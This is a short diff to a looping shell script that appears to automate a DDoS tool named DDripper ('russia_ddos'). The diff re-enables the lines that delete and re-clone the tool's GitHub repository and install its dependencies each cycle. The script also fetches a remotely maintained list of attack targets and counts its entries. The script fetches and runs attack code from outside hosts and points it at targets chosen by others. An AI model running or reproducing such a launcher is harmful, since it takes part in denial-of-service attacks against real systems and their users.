@@ -28,15 +28,15 @@ while true
 do
    # Download latest version of DDripper.
    cd ~
-   #rm -rf russia_ddos
-   #git clone https://github.com/alexmon1989/russia_ddos.git > /dev/null
+   rm -rf russia_ddos
+   git clone https://github.com/alexmon1989/russia_ddos.git > /dev/null
    cd russia_ddos
-   #pip install -r requirements.txt > /dev/null
+   pip install -r requirements.txt > /dev/null
    
    # Get number of targets in DRipper_targets
    list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | wc -l)
    
-   echo -e "\n===================================="
+   echo -e "\n"
    echo -e "Number of targets in list: " $list_size "\n"
    sleep 1
 
